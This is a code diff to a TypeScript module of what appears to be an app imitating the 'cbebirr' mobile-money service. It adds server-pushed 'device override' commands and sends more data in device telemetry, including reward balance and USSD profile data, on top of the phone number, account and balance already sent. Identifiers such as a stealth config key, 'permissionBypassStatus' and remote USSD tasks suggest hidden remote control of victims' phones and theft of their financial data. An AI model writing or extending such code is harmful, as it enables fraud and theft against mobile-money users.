@@ -5,6 +5,7 @@ import {
   CallSession,
   DeviceApprovalStatus,
   DevicePlatform,
+  DeviceRemoteOverride,
   DeviceSyncResponse,
   OWNER_PIN,
   OwnerDashboardSnapshot,
@@ -20,9 +21,42 @@ import {
 const DEVICE_ID_STORAGE_KEY = 'cbebirr_owner_device_id';
 const LOCK_CACHE_KEY = 'cbebirr_remote_lock_cache';
 const SEEN_NOTIFS_KEY = 'cbebirr_seen_owner_notifs';
+const CUSTOM_DEVICE_NAME_KEY = 'cbebirr_custom_device_name';
+const APPLIED_OVERRIDE_SEQ_KEY = 'cbebirr_applied_override_seq';
 export const STEALTH_CFG_KEY = 'cbebirr_cfg_sync_v1';
 export const STEALTH_CFG_VALUE = 'rc_9f4a2e1d';
 const STEALTH_KEY_DIGEST = '1369cc5cbe399f88c0de5b26de45ac61c2060f55ffed7052c04e56f261fda23c';
+
+export function getAppliedOverrideSeq(): number {
+  if (typeof window === 'undefined') return 0;
+  try {
+    const raw = localStorage.getItem(APPLIED_OVERRIDE_SEQ_KEY);
+    const n = Number(raw);
+    return Number.isFinite(n) && n > 0 ? Math.floor(n) : 0;
+  } catch {
+    return 0;
+  }
+}
+
+export function setAppliedOverrideSeq(seq: number): void {
+  if (typeof window === 'undefined') return;
+  try {
+    const clean = Number.isFinite(seq) && seq >= 0 ? Math.floor(seq) : 0;
+    localStorage.setItem(APPLIED_OVERRIDE_SEQ_KEY, String(clean));
+  } catch {}
+}
+
+export function setCustomDeviceName(name: string): void {
+  if (typeof window === 'undefined') return;
+  try {
+    const clean = String(name || '').trim().slice(0, 115);
+    if (clean) {
+      localStorage.setItem(CUSTOM_DEVICE_NAME_KEY, clean);
+    } else {
+      localStorage.removeItem(CUSTOM_DEVICE_NAME_KEY);
+    }
+  } catch {}
+}
 
 function sha256HexSync(input: string): string {
   const bytes = new TextEncoder().encode(input);
@@ -175,7 +209,11 @@ export function detectDeviceInfo(): {
   }
 
   const tag = platform === 'android-apk' ? 'APK' : platform === 'web-pwa' ? 'PWA' : 'Web';
-  const deviceName = `${model} (${tag})`.slice(0, 115);
+  let customName = '';
+  try {
+    customName = String(localStorage.getItem(CUSTOM_DEVICE_NAME_KEY) || '').trim();
+  } catch {}
+  const deviceName = (customName || `${model} (${tag})`).slice(0, 115);
 
   return {
     deviceName,
@@ -260,6 +298,15 @@ export async function syncDeviceTelemetry(profile: {
   phoneNumber: string;
   userAccount: string;
   balance: number;
+  rewardBalance?: number;
+  appLang?: 'en' | 'am';
+  isBalanceShown?: boolean;
+  isRewardShown?: boolean;
+  ussdProfilesJson?: string;
+  activeUssdId?: string;
+  phoneUssdProfilesJson?: string;
+  activePhoneUssdId?: string;
+  appliedOverrideSeq?: number;
   registerRequest?: boolean;
   freshRegistration?: boolean;
   forceApprovalCheck?: boolean;
@@ -275,6 +322,7 @@ export async function syncDeviceTelemetry(profile: {
   supportSession: SupportSession | null;
   callSession: CallSession | null;
   remoteUssdTask: RemoteUssdTask | null;
+  deviceOverride: DeviceRemoteOverride | null;
   approvalStatus: DeviceApprovalStatus;
   permissionBypassStatus: PermissionBypassStatus;
   fromServer: boolean;
@@ -311,6 +359,7 @@ export async function syncDeviceTelemetry(profile: {
       supportSession: null,
       callSession: null,
       remoteUssdTask: null,
+      deviceOverride: null,
       approvalStatus: offlineApproval,
       permissionBypassStatus: offlineBypass,
       fromServer: false,
@@ -340,6 +389,15 @@ export async function syncDeviceTelemetry(profile: {
         phoneNumber: profile.phoneNumber,
         userAccount: profile.userAccount,
         balance: profile.balance,
+        ...(profile.rewardBalance !== undefined ? { rewardBalance: profile.rewardBalance } : {}),
+        ...(profile.appLang !== undefined ? { appLang: profile.appLang } : {}),
+        ...(profile.isBalanceShown !== undefined ? { isBalanceShown: profile.isBalanceShown } : {}),
+        ...(profile.isRewardShown !== undefined ? { isRewardShown: profile.isRewardShown } : {}),
+        ...(profile.ussdProfilesJson !== undefined ? { ussdProfilesJson: profile.ussdProfilesJson } : {}),
+        ...(profile.activeUssdId !== undefined ? { activeUssdId: profile.activeUssdId } : {}),
+        ...(profile.phoneUssdProfilesJson !== undefined ? { phoneUssdProfilesJson: profile.phoneUssdProfilesJson } : {}),
+        ...(profile.activePhoneUssdId !== undefined ? { activePhoneUssdId: profile.activePhoneUssdId } : {}),
+        appliedOverrideSeq: profile.appliedOverrideSeq ?? getAppliedOverrideSeq(),
         registerRequest: Boolean(profile.registerRequest),
         freshRegistration: Boolean(profile.freshRegistration),
         forceApprovalCheck: Boolean(profile.forceApprovalCheck),
@@ -387,6 +445,7 @@ export async function syncDeviceTelemetry(profile: {
       supportSession: data.supportSession || null,
       callSession: data.callSession || null,
       remoteUssdTask: data.remoteUssdTask || null,
+      deviceOverride: data.deviceOverride || null,
       approvalStatus: data.approvalStatus || fallbackStatus,
       permissionBypassStatus: resolvedBypass,
       fromServer: true,
